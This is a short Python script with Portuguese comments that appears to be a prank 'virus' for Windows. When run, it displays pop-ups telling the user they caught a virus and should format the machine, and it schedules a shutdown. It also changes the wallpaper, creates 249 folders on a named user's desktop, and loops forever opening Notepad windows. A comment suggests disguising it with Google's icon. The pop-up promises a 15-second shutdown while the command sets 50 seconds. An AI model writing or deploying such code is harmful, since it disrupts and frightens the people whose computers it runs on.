import os
import time
import  ctypes
#alterar o icone com o do google

def cria_pastas():
    for i in range(1,250):
            os.system(f'mkdir C:\\Users\prod-armelo\Desktop\{i}')
    #criar varias pastas
#
def wallpaper():
    wallpaper_path = "C:/Users/suporte/Desktop/euu.jpeg"
    ctypes.windll.user32.SystemParametersInfoW(20,0, wallpaper_path, 3)

def Shutdown():
    os.system('msg %username% vc pegou o virus vulgo pega troxa, formate sua máquina')
    os.system('msg %username% Sua maquina desligará em 15 segundos')
    os.system('shutdown -s -t 50')
def trava():
    while True:
        os.system('start notepad')
        time.sleep(1.8)

Shutdown()
wallpaper()
cria_pastas()
trava()
